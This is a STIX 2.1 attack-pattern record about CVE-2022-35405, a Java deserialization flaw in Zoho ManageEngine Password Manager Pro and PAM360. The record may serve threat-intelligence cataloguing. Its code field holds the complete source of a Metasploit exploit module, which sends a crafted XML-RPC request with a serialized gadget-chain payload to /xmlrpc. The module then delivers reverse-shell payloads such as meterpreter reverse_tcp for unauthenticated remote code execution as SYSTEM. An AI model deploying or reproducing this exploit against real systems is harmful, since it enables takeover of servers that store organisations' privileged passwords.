{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b47afcb-fc4c-4ae5-b16f-1070b0d24db4",
    "created": "2024-08-14T16:54:31.337202Z",
    "modified": "2024-08-14T16:54:31.337206Z",
    "name": "Zoho Password Manager Pro XML-RPC Java Deserialization",
    "description": " This module exploits a Java deserialization vulnerability in Zoho ManageEngine Pro before 12101 and PAM360 before 5510. Unauthenticated attackers can send a crafted XML-RPC request containing malicious serialized data to /xmlrpc to gain RCE as the SYSTEM user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/zoho_password_manager_pro_xml_rpc_rce.rb",
            "external_id": "zoho_password_manager_pro_xml_rpc_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-35405"
        },
        {
            "source_name": "reference",
            "url": "https://archives2.manageengine.com/passwordmanagerpro/12101/ManageEngine_PasswordManager_Pro_12100_to_12101.ppm#Thepatch."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::JavaDeserialization\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zoho Password Manager Pro XML-RPC Java Deserialization',\n        'Description' => %q{\n          This module exploits a Java deserialization vulnerability in Zoho ManageEngine Pro\n          before 12101 and PAM360 before 5510. Unauthenticated attackers can send a\n          crafted XML-RPC request containing malicious serialized data to /xmlrpc to\n          gain RCE as the SYSTEM user.\n        },\n        'Author' => [\n          'Vinicius', # Discovery\n          'Y4er', # Writeup\n          'Grant Willcox' # Exploit\n        ],\n        'References' => [\n          ['CVE', '2022-35405'],\n          ['URL', 'https://xz.aliyun.com/t/11578'], # Writeup\n          ['URL', 'https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html'], # Advisory\n          ['URL', 'https://archives2.manageengine.com/passwordmanagerpro/12101/ManageEngine_PasswordManager_Pro_12100_to_12101.ppm'] # The patch.\n        ],\n        'DisclosureDate' => '2022-06-24', # Vendor release date of patch and new installer, as advisory lacks any date.\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'Arch' => [ARCH_CMD, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows EXE Dropper',\n            {\n              'Arch' => ARCH_X64,\n              'Type' => :windows_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_command,\n              'Space' => 3000,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/reverse_powershell' }\n            }\n          ],\n          [\n            'Windows Powershell',\n            {\n              'Arch' => ARCH_X64,\n              'Type' => :windows_powershell,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell/x64/meterpreter/reverse_tcp' }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(7272),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    # Send an empty serialized object\n    res = send_request_xmlrpc('')\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    if res.body.include?('Failed to read result object: null')\n      return CheckCode::Vulnerable('Target can deserialize arbitrary data.')\n    end\n\n    CheckCode::Safe('Target cannot deserialize arbitrary data.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :windows_command\n      execute_command(payload.encoded)\n    when :windows_dropper\n      cmd_target = targets.select { |target| target['Type'] == :windows_command }.first\n      execute_cmdstager({ linemax: cmd_target.opts['Space'] })\n    when :windows_powershell\n      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    res = send_request_xmlrpc(\n      generate_java_deserialization_for_command('CommonsBeanutils1', 'cmd', cmd)\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Failed to execute command: #{cmd}\")\n    end\n\n    print_good(\"Successfully executed command: #{cmd}\")\n  end\n\n  def send_request_xmlrpc(data)\n    # http://xmlrpc.com/\n    # https://ws.apache.org/xmlrpc/\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/xmlrpc'),\n      'ctype' => 'text/xml',\n      'data' => <<~XML\n        <?xml version=\"1.0\"?>\n        <methodCall>\n          <methodName>#{rand_text_alphanumeric(8..42)}</methodName>\n          <params>\n            <param>\n              <value>\n                <struct>\n                  <member>\n                    <name>#{rand_text_alphanumeric(8..42)}</name>\n                    <value>\n                      <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">#{Rex::Text.encode_base64(data)}</serializable>\n                    </value>\n                  </member>\n                </struct>\n              </value>\n            </param>\n          </params>\n        </methodCall>\n      XML\n    )\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2022-06-24, # Vendor release date of patch and new installer, as advisory lacks any date.",
    "x_mitre_platforms": [
        "['win']"
    ]
}